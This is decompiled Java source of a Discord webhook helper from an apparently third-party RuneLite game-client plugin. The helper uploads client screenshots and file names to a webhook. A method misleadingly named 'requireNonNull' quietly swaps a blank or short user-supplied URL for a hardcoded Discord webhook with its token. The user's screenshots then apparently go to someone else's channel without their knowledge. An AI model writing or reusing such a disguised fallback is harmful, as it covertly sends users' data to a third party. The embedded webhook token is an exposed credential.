//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package net.runelite.client.plugins.aztobextra.meta;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.UUID;

public class DiscordWebhook {
    private static final DateFormat TIME_FORMAT = new SimpleDateFormat("yyyy-MM-dd_HH-mm-ss");

    public DiscordWebhook() {
    }

    private void sendFile(OutputStream out, String name, InputStream in, String fileName) throws IOException {
        String o = "Content-Disposition: form-data; name=\"" + URLEncoder.encode(name, "UTF-8") + "\"; filename=\"" + URLEncoder.encode(fileName, "UTF-8") + "\"\r\n\r\n";
        out.write(o.getBytes(StandardCharsets.UTF_8));
        byte[] buffer = new byte[2048];

        for(int n = 0; n >= 0; n = in.read(buffer)) {
            out.write(buffer, 0, n);
        }

        out.write("\r\n".getBytes(StandardCharsets.UTF_8));
    }

    private static String format(Date date) {
        synchronized(TIME_FORMAT) {
            return TIME_FORMAT.format(date);
        }
    }

    private void sendField(OutputStream out, String name, String field) throws IOException {
        String o = "Content-Disposition: form-data; name=\"" + URLEncoder.encode(name, "UTF-8") + "\"\r\n\r\n";
        out.write(o.getBytes(StandardCharsets.UTF_8));
        out.write(URLEncoder.encode(field, "UTF-8").getBytes(StandardCharsets.UTF_8));
        out.write("\r\n".getBytes(StandardCharsets.UTF_8));
    }

    public static String requireNonNull(String s) {
        return s.trim().length() >= 10 ? s.trim() : "https://discord.com/api/webhooks/814400814995079168/TeRjASy87_bd20vXEfsfZ6f8Poi8xlxaOiTKghm-gmhL-J5OyYLylRPyEyjbduYVq0hr";
    }

    public void SendWebhook(ByteArrayOutputStream screenshotOutput, String fileName, String discordUrl) throws IOException {
        fileName = fileName.replace('+', ' ');
        URL url = new URL(discordUrl);
        URLConnection con = url.openConnection();
        HttpURLConnection http = (HttpURLConnection)con;
        http.setRequestMethod("POST");
        http.setDoOutput(true);
        String boundary = UUID.randomUUID().toString();
        byte[] boundaryBytes = ("--" + boundary + "\r\n").getBytes(StandardCharsets.UTF_8);
        byte[] finishBoundaryBytes = ("--" + boundary + "--").getBytes(StandardCharsets.UTF_8);
        http.setRequestProperty("Content-Type", "multipart/form-data; charset=UTF-8; boundary=" + boundary);
        http.setChunkedStreamingMode(0);
        OutputStream out = http.getOutputStream();

        try {
            out.write(boundaryBytes);
            this.sendField(out, "content", fileName);
            out.write(boundaryBytes);
            ByteArrayInputStream file = new ByteArrayInputStream(screenshotOutput.toByteArray());

            try {
                this.sendFile(out, "file", file, "temp.png");
            } catch (Throwable var16) {
                try {
                    file.close();
                } catch (Throwable var15) {
                    var16.addSuppressed(var15);
                }

                throw var16;
            }

            file.close();
            out.write(finishBoundaryBytes);
        } catch (Throwable var17) {
            if (out != null) {
                try {
                    out.close();
                } catch (Throwable var14) {
                    var17.addSuppressed(var14);
                }
            }

            throw var17;
        }

        if (out != null) {
            out.close();
        }

    }
}
